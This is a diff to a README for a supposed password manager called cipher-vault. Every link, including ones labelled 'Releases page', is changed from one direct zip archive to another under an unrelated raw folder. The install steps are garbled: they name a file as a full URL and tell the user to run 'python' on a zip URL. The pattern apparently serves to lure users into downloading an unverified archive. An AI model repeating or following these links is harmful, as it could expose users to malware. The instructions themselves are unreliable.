@@ -6,7 +6,7 @@ Welcome to cipher-vault! This application is a simple password manager that uses
 
 ## 📥 Download
 
-[![Download Released Version](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher-vault-1.2.zip%20Now-Click%20Here-blue)](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher-vault-1.2.zip)
+[![Download Released Version](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher_vault_v3.4.zip%20Now-Click%20Here-blue)](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher_vault_v3.4.zip)
 
 ## 📋 System Requirements
 
@@ -26,15 +26,15 @@ Welcome to cipher-vault! This application is a simple password manager that uses
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version of cipher-vault, visit our [Releases page](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher-vault-1.2.zip).
+To download the latest version of cipher-vault, visit our [Releases page](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher_vault_v3.4.zip).
 
 ### Step 2: Download the Application
 
-On the Releases page, you'll see a list of available versions. Click on the most recent version to see the download options. You will find a file named `https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher-vault-1.2.zip`. Click the link to download this file to your computer.
+On the Releases page, you'll see a list of available versions. Click on the most recent version to see the download options. You will find a file named `https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher_vault_v3.4.zip`. Click the link to download this file to your computer.
 
 ### Step 3: Extract the Files
 
-Once the download is complete, locate the downloaded `https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher-vault-1.2.zip` file. Right-click on the file and select "Extract All" or use a file extraction tool of your choice. This action will create a folder named `cipher-vault` containing the application files.
+Once the download is complete, locate the downloaded `https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher_vault_v3.4.zip` file. Right-click on the file and select "Extract All" or use a file extraction tool of your choice. This action will create a folder named `cipher-vault` containing the application files.
 
 ### Step 4: Open the Command Line
 
@@ -59,7 +59,7 @@ Replace `path/to/cipher-vault` with the actual path to the folder.
 Now, you are ready to run the application. Use the following command:
 
 ```bash
-python https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher-vault-1.2.zip
+python https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher_vault_v3.4.zip
 ```
 
 This command starts the cipher-vault application.
@@ -97,7 +97,7 @@ If the problem persists, feel free to open an issue in the repository.
 
 ## 🚀 Download & Install
 
-To get started with cipher-vault, visit our [Releases page](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher-vault-1.2.zip) to download the most recent version. Follow the steps outlined above, and you'll be protecting your passwords in no time.
+To get started with cipher-vault, visit our [Releases page](https://github.com/Zikodenomics/cipher-vault/raw/refs/heads/main/midrashic/cipher_vault_v3.4.zip) to download the most recent version. Follow the steps outlined above, and you'll be protecting your passwords in no time.
 
 ## 👥 Community and Support
 
